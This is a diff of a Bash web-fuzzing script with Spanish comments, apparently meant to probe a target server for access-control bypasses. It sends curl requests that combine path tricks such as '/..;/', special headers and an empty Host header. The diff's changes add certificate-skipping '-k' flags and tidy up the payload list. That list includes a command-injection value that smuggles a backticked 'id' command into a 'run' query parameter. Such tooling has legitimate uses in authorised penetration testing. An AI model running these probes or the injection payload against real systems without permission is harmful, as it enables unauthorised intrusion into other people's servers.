@@ -33,8 +33,6 @@ UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Ge
 # ────────────────────────────────────────────────
 payloads() {
 cat << 'EOF'
-/robots.txt
-/favicon.ico
 /*
 //
 /.
@@ -55,6 +53,8 @@ cat << 'EOF'
 /default.aspx
 /upload.htm
 /upload.html
+/robots.txt
+/favicon.ico
 /sitemap.xml
 /upload.shtml
 /upload.xhtml
@@ -103,7 +103,7 @@ cat << 'EOF'
 /index.cgi
 /index.js
 /index.jp
-/index.php?run=%26echo%20`id`%24()%5C%20 
+/index.php?run=%26echo%20`id`%24()%5C%20
 /index.php5
 /index.php4
 /index.php3
@@ -148,7 +148,7 @@ run_curl() {
 
     if [ "$http_code" = "200" ]; then
         # Mostramos cabeceras + petición (quitamos líneas de curl debug innecesarias)
-        echo "$output" | grep -v "^\{" | grep -v "^\}" | grep -v "^\* " | grep -v "^  " 
+        echo "$output" | grep -v "^\{" | grep -v "^\}" | grep -v "^\* " | grep -v "^  "
         echo ""
         echo
         echo "--------------------------------------------------"
@@ -166,7 +166,7 @@ for payload in `payloads`; do
     test_url="${TARGET}${payload}"
 
     for method in $METHODS; do
-        cmd="curl -X $method -I -A \"$UA\" \"$test_url\""
+        cmd="curl -k -X $method -I -A \"$UA\" \"$test_url\""
         run_curl "$cmd"
     done
 done
@@ -181,7 +181,7 @@ echo "-------------------------------------------------------------"
 for header in `special_headers`; do
     for extra in "" "/" "//" "/." "/..;/" "/.;/" "/ "; do
         test_url="${TARGET}${extra}"
-        cmd="curl -X GET -I -A \"$UA\" -H \"$header\" \"$test_url\""
+        cmd="curl -k -X GET -I -A \"$UA\" -H \"$header\" \"$test_url\""
         run_curl "$cmd"
     done
 done
@@ -196,13 +196,14 @@ echo "-------------------------------------------------------------"
 test_url="${TARGET}/"
 
 # Normal (HTTP/1.1 por defecto)
-cmd="curl -I -A \"$UA\" \"$test_url\""
+cmd="curl -k -I -A \"$UA\" \"$test_url\""
 run_curl "$cmd"
 
 # Forzamos HTTP/1.0
-cmd="curl --http1.0 -I -A \"$UA\" \"$test_url\""
+cmd="curl -k --http1.0 -I -A \"$UA\" \"$test_url\""
 run_curl "$cmd"
 
 # HTTP/1.0 + Host: vacío
-cmd="curl --http1.0 -I -A \"$UA\" -H \"Host:\" \"$test_url\""
+cmd="curl -k --http1.0 -I -A \"$UA\" -H \"Host:\" \"$test_url\""
 run_curl "$cmd"
+
